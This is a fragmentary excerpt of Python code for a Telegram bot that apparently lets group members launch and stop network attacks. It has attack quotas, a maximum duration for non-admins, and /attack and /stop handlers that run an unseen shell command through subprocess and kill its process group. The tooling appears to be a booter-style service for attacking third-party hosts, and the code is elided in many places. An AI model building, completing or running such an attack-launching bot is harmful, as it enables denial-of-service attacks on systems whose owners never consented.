...
COOLDOWN_TIME = 0
ATTACK_LIMIT = 5
MAX_DURATION = 180  # Applies only to non-admins
MUTE_DURATION = 86400
...
def handle_broadcast(message):
    ...
    if not current_group_ids:
        bot.reply_to(message, "⚠️ No groups found to broadcast to! Add the bot to groups and use /addgroup or /attack to register them.")
        logger.warning("No group IDs available for broadcast")
        return
...
def handle_attack(message):
    ...
    try:
        attack_process = subprocess.Popen(full_command, shell=True, preexec_fn=subprocess.os.setsid)
        active_attacks[group_id] = attack_process
        
        # Wait for the process to complete or be stopped
        attack_process.wait()
        
        if group_attacks[group_id]:  # Only update if not stopped
            if not is_admin:
...
def handle_stop(message):
    ...
    try:
        # Use os.killpg to terminate the process group instantly
        import os
        os.killpg(os.getpgid(attack_process.pid), signal.SIGTERM)
        attack_process.wait(timeout=1)  # Wait briefly to confirm termination
    except subprocess.TimeoutExpired:
        attack_process.kill()  # Force kill if it doesn't terminate
    except Exception as e:
